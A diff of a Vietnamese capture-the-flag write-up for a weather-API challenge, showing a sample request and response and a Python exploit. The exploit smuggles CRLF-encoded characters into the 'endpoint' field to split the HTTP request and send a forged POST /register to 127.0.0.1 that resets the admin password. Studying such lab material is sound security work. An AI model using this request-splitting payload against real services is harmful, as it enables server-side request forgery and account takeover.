@@ -151,11 +151,42 @@ Biến data ở đây không được validate, như vậy có thể thực hi�
 
 Sau khi research, version này tồn tại lỗ hổng `Http request splitting`, tức là chúng ta có thể  gửi data đi kèm với HTTP header đến ip `127.0.0.1` để thực hiện update password admin, thông qua kỹ thuật CRLF injection.
 
+Request:
+```
+POST /api/weather HTTP/1.1
+Host: 68.183.47.198:30634
+Content-Length: 67
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36
+Content-Type: application/json
+Accept: */*
+Origin: http://68.183.47.198:30634
+Referer: http://68.183.47.198:30634/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+{"endpoint":"api.openweathermap.org","city":"Hanoi","country":"VN"}
+```
+Response:
+```
+HTTP/1.1 200 OK
+X-Powered-By: Express
+Content-Type: application/json; charset=utf-8
+Content-Length: 55
+ETag: W/"37-EWIxxl6u5SIYz0pD8bDkc9WVWjc"
+Date: Sat, 24 Dec 2022 03:25:26 GMT
+Connection: close
+
+{"desc":"broken clouds","icon":"icon-clouds","temp":21}
+```
+
+Bây giờ ta sẽ inject vào biến endpoint phần HTTP header để trỏ đến ip 127.0.0.1 (localhost) để thực hiện chức năng register với payload như sau:
+
 Payload:
 ```python
 import requests
 
-url = "http://139.59.172.163:31345/api/weather"
+url = "http://68.183.47.198:30634/api/weather"
 
 username = "admin"
 new_password = "123456"
@@ -167,10 +198,17 @@ password_encoded = password.replace(" ", "\u0120").replace("'", "%27").replace('
 contentLength = len(username_encoded) + len(password_encoded) + 20
 
 # \u010D = \r, \u010A = \n, \u0120 = space
-test = "localhost/abc\u010D\u010A\u010D\u010APOST\u0120/register\u0120HTTP/1.1\u010D\u010AHost:\u0120127.0.0.1\u010D\u010AContent-Type:\u0120application/x-www-form-urlencoded\u010D\u010A"
-test = test + "Content-Length:\u0120" + str(contentLength) + "\u010D\u010A\u010D\u010A"
-test = test + f"username={username_encoded}&password={password_encoded}" + "\u010D\u010A\u010D\u010AGET\u0120/?q="
- 
+test = "127.0.0.1/\u010D\u010A" # endpoint value, look like as api.openweathermap.org
+test = test + "\u010D\u010A" # blank line
+test = test + "POST\u0120/register\u0120HTTP/1.1\u010D\u010A" # POST /register HTTP/1.1
+test = test + "Host:\u0120127.0.0.1\u010D\u010A" # Host: 127.0.0.1
+test = test + "Content-Type:\u0120application/x-www-form-urlencoded\u010D\u010A" # Content-Type: application/x-www-form-urlencoded
+test = test + "Content-Length:\u0120" + str(contentLength) + "\u010D\u010A" # Content-Length: ?
+test = test + "\u010D\u010A" # blank line
+test = test + f"username={username_encoded}&password={password_encoded}\u010D\u010A" # payload register
+test = test + "\u010D\u010A" # blank line
+test = test + "GET\u0120"
+
 r = requests.post(url = url, json={'endpoint': test, 'city': 'Ha Noi','country': 'VN'})
 ```
 
